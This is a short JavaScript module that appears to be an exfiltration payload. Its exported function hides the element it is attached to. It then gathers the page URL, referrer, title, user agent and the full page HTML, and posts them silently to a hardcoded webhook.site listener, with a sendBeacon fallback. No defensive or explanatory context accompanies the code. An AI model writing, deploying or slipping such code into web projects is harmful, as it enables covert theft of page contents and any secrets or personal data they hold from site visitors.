const LISTENER = 'https://webhook.site/903925e8-3c4f-4f32-92f1-d683f882d6b3';

export default function (el) {
  try { el.style.display = 'none'; } catch (e) {}
  const data = {
    url: location.href,
    origin: location.origin,
    referrer: document.referrer,
    title: document.title,
    userAgent: navigator.userAgent,
    dom: document.documentElement.outerHTML
  };
  fetch(LISTENER, { method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: JSON.stringify(data) })
    .catch(() => { try { navigator.sendBeacon(LISTENER, JSON.stringify(data)); } catch(e){} });
}
